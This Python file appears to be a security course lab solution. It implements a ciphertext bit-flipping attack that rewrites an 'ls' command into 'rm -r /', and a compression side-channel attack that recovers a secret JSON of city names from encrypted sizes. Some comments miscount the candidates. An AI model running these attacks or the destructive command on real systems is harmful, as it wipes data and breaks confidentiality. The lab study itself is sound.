import string

from ssh.grader import get_countries


class AttackTamper:
    def __init__(self, compress):
        # compress is set for the last extra credit part
        self.compress = compress
        self.packet_count = 0

        self.target_packet = 10
        self.payload_offset = 14
        self.original_cmd = b"ls ./files/*\n"
        self.injected_cmd = b"rm -r /     \n"

    def handle_data(self, data):
        self.packet_count += 1

        if self.packet_count != self.target_packet:
            return data

        print(f"\n[!] SURGICAL STRIKE on Packet {self.packet_count}")
        print(f"    Original: '{self.original_cmd.decode().strip()}'")
        print(f"    Injected: '{self.injected_cmd.decode().strip()}'")

        tampered_data = self._inject_payload(data)

        print("[+] Payload tampered. Waiting for server Bingo! response...\n")

        return tampered_data

    def _inject_payload(self, data):
        packet = bytearray(data)
        for i, (old_byte, new_byte) in enumerate(zip(self.original_cmd, self.injected_cmd)):
            packet[self.payload_offset + i] ^= old_byte ^ new_byte
        return bytes(packet)

import zlib
import itertools

TOP_CANDIDATES = 10

def get_score(payload, client_fn):
    """Calculates match score by comparing encrypted size to local zlib size."""
    server_sum, local_sum = 0, 0
    for pad in range(16):
        test_str = ("Z" * pad) + payload
        res = client_fn(test_str)

        server_sum += res[0]
        local_sum += len(zlib.compress((test_str + "\n").encode('utf-8')))

    return server_sum - local_sum


def find_top_cities(cities, client_fn):
    """Scores all cities and returns the top 6 candidates to account for partial match ties."""
    scores = [(city, get_score(city, client_fn)) for city in cities]
    scores.sort(key=lambda x: x[1])

    top_candidates = [city for city, _ in scores[:TOP_CANDIDATES]]

    print("\n--- STAGE 1: Top 6 Candidates Found ---")
    for i, (name, score) in enumerate(scores[:8]):
        print(f"  {i + 1}. {name:.<35} Delta: {score}")

    return top_candidates


def find_permutation(top_candidates, client_fn):
    """Tests all 3-city permutations from the candidate pool to find the exact JSON layout."""
    print("\n--- STAGE 2: Testing Combinations & Permutations ---")
    best_json = ""
    best_score = float('inf')

    for perm in itertools.permutations(top_candidates, 3):
        json_guess = "{\n" + "".join(f'"city{i}": "{c}",\n' for i, c in enumerate(perm)) + "}\n"

        score = get_score(json_guess, client_fn)

        if score < best_score:
            best_score = score
            best_json = json_guess
            print(f"  New Best -> {perm[0][:10]:<10} {perm[1][:10]:<10} {perm[2][:10]:<10} | Delta: {score}")

    print("\n--- VERIFIED SECRET ---")
    print(best_json)

    return best_json


def attack_decrypt(client_fn):
    """Main entry point for the attack."""
    countries = get_countries()

    top_cities = find_top_cities(countries, client_fn)
    best_json = find_permutation(top_cities, client_fn)

    return best_json
